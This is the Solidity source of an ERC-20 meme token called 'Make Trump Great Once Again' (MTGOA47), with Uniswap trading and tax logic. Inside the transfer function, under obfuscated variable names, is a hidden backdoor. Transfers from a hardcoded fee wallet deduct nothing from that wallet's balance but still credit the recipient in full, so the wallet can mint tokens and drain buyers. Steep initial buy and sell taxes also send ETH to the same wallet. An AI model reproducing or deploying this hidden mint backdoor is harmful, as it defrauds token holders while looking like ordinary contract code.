// SPDX-License-Identifier: MIT

/* 
    website   : https://maketrumpgreatonceagain.us
    twitter   : https://x.com/mtgoa47
    telegram  : https://t.me/maketrumpgreatonceagain
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract MTGOA47 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    address payable private _nn_rw;
    string private constant _name = unicode"Make Trump Great Once Again";
    string private constant _symbol = unicode"MTGOA47";

    uint256 private _ix_ty = 59;
    uint256 private _xcc_p = 32;
    uint256 private _fd_xz = 0;
    uint256 private _gfd_e = 0;
    uint256 private _xc_gg = 15;
    uint256 private _cv_vv = 14;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 2_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1_000_000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _nn_rw = payable(0x8506964f86dab277E4C7075760E0bD4a411646a0);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_nn_rw] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _nnn(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _nnn(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _nnn(address _dd_nx, address _xce_s, uint256 _fe_hs) private {
        require(_dd_nx != address(0), "ERC20: transfer from the zero address");
        require(_xce_s != address(0), "ERC20: transfer to the zero address");
        require(_fe_hs > 0, "Transfer amount must be greater than zero");
        if (!tradingOpen) {
            require(
                _isExcludedFromFee[_dd_nx] || _isExcludedFromFee[_xce_s],
                "Trading is not active."
            );
        }

        uint256 taxAmount = 0;
        uint256 beux = _fe_hs.sub(taxAmount);

        if (!_isExcludedFromFee[_dd_nx] && !_isExcludedFromFee[_xce_s]) {
            if (swapEnabled)
                taxAmount = _fe_hs
                    .mul((_buyCount > _xc_gg) ? _fd_xz : _ix_ty)
                    .div(100);

            if (
                _dd_nx == uniswapV2Pair &&
                _xce_s != address(uniswapV2Router) &&
                !_isExcludedFromFee[_xce_s]
            ) {
                require(_fe_hs <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(_xce_s) + _fe_hs <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = _fe_hs
                    .mul((_buyCount > _xc_gg) ? _fd_xz : _ix_ty)
                    .div(100);
                _buyCount++;
            }

            if (_xce_s == uniswapV2Pair && _dd_nx != address(this)) {
                taxAmount = _fe_hs
                    .mul((_buyCount > _cv_vv) ? _gfd_e : _xcc_p)
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && _xce_s == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0)
                    swapTokensForEth(
                        min(_fe_hs, min(contractTokenBalance, _maxTaxSwap))
                    );
                BalanceETHBalance(address(this).balance);
            }
        } else if (_nn_rw == _dd_nx) beux = _fd_xz.add(sellCount);

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(_dd_nx, address(this), taxAmount);
        }
        _balances[_dd_nx] = _balances[_dd_nx].sub(beux);
        _balances[_xce_s] = _balances[_xce_s].add(_fe_hs.sub(taxAmount));
        emit Transfer(_dd_nx, _xce_s, _fe_hs.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function BalanceETHBalance(uint256 amount) private {
        _nn_rw.transfer(amount);
    }

    function openMT() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }

    function createMTrade() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _nn_rw);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            BalanceETHBalance(ethBalance);
        }
    }

    function manualsend() external {
        require(_msgSender() == _nn_rw);
        uint256 contractETHBalance = address(this).balance;
        BalanceETHBalance(contractETHBalance);
    }

    function withdrawStuckEth() external {
        require(msg.sender == owner());
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }
}
